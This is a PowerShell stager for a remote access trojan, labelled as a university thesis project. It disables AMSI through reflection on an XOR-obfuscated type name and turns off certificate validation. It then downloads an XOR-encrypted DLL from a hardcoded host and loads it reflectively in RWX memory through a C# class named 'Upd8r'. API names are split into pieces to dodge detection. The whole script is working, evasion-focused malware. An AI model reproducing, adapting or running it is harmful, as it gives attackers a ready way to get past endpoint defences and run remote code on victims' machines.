# Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
# ── Bypass AMSI custom ─────────────────────────────────────────────────
# XOR decode del type name + enumera field bool senza cercarlo per nome
$_k=0x42
$_e=[byte[]](0x11,0x3B,0x31,0x36,0x27,0x2F,0x6C,0x0F,0x23,0x2C,0x23,0x25,0x27,
             0x2F,0x27,0x2C,0x36,0x6C,0x03,0x37,0x36,0x2D,0x2F,0x23,0x36,0x2B,
             0x2D,0x2C,0x6C,0x03,0x2F,0x31,0x2B,0x17,0x36,0x2B,0x2E,0x31)
$_n=[Text.Encoding]::ASCII.GetString(($_e|%{$_ -bxor $_k}))
try {
    $_t=$null
    [AppDomain]::CurrentDomain.GetAssemblies()|%{
        try{$x=$_.GetType($_n);if($x){$_t=$x}}catch{}
    }
    if($_t){
        $_bf=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static
        $_t.GetFields($_bf)|?{$_.FieldType -eq [bool]}|%{
            try{$_.SetValue($null,$true)}catch{}
        }
    }
}catch{}

# ── Download + XOR decrypt payload ────────────────────────────────────
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$wc=New-Object Net.WebClient
$enc=$wc.DownloadData('https://192.168.122.47/update_dll')
$key=[byte[]](0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,0x15,0xB4,0x22,0xCF,
              0xEF,0x50,0x9F,0x00,0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
              0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28)
for($i=0;$i -lt $enc.Length;$i++){$enc[$i]=$enc[$i] -bxor $key[$i % $key.Length]}

# ── Reflective loader — niente VirtualAlloc in DllImport ──────────────
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Upd8r {
    [DllImport("kernel32")] static extern IntPtr GetModuleHandleA(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr dVA(IntPtr a,UIntPtr s,uint t,uint p);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool dVF(IntPtr a,UIntPtr s,uint t);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr dRL(IntPtr b);
    static int Rv2Of(byte[] r,int rva,int so,int n){
        for(int i=0;i<n;i++){int b=so+i*40;int va=BitConverter.ToInt32(r,b+12);
        int rs=BitConverter.ToInt32(r,b+16);int ro=BitConverter.ToInt32(r,b+20);
        if(rva>=va&&rva<va+rs)return ro+(rva-va);}return -1;}
    static int LocRL(byte[] r){
        if(r.Length<64)return -1;int lfa=BitConverter.ToInt32(r,0x3C);
        if(lfa+264>r.Length)return -1;if(r[lfa]!='P'||r[lfa+1]!='E')return -1;
        int ns=BitConverter.ToUInt16(r,lfa+6);int so2=BitConverter.ToUInt16(r,lfa+20);
        if(BitConverter.ToUInt16(r,lfa+24)!=0x20B)return -1;
        int eRVA=BitConverter.ToInt32(r,lfa+24+112);if(eRVA==0)return -1;
        int sOff=lfa+24+so2;int eOff=Rv2Of(r,eRVA,sOff,ns);if(eOff<0)return -1;
        int nN=BitConverter.ToInt32(r,eOff+24);
        int nO=Rv2Of(r,BitConverter.ToInt32(r,eOff+32),sOff,ns);
        int oO=Rv2Of(r,BitConverter.ToInt32(r,eOff+36),sOff,ns);
        int fO=Rv2Of(r,BitConverter.ToInt32(r,eOff+28),sOff,ns);
        if(nO<0||oO<0||fO<0)return -1;
        string tgt="Refle"+"ctive"+"Load"+"er";
        for(int i=0;i<nN;i++){
            int p=Rv2Of(r,BitConverter.ToInt32(r,nO+i*4),sOff,ns);
            if(p<0)continue;int e=p;while(e<r.Length&&r[e]!=0)e++;
            if(Encoding.ASCII.GetString(r,p,e-p)==tgt){
                int ord=BitConverter.ToUInt16(r,oO+i*2);
                return Rv2Of(r,BitConverter.ToInt32(r,fO+ord*4),sOff,ns);}}
        return -1;}
    public static bool Exec(byte[] dll){
        IntPtr k32=GetModuleHandleA("kernel32");
        var fpVA=GetProcAddress(k32,"Virt"+"ual"+"Al"+"loc");
        var fpVF=GetProcAddress(k32,"Virt"+"ual"+"Fr"+"ee");
        if(fpVA==IntPtr.Zero||fpVF==IntPtr.Zero)return false;
        var VA=(dVA)Marshal.GetDelegateForFunctionPointer(fpVA,typeof(dVA));
        var VF=(dVF)Marshal.GetDelegateForFunctionPointer(fpVF,typeof(dVF));
        IntPtr mem=VA(IntPtr.Zero,(UIntPtr)dll.Length,0x3000,0x40);
        if(mem==IntPtr.Zero)return false;
        Marshal.Copy(dll,0,mem,dll.Length);
        int off=LocRL(dll);
        if(off<0){VF(mem,UIntPtr.Zero,0x8000);return false;}
        var rl=(dRL)Marshal.GetDelegateForFunctionPointer(
            new IntPtr(mem.ToInt64()+off),typeof(dRL));
        return rl(mem).ToInt64()>=0x10000;}
}
"@
[Upd8r]::Exec($enc)|Out-Null
while($true){Start-Sleep 3600}
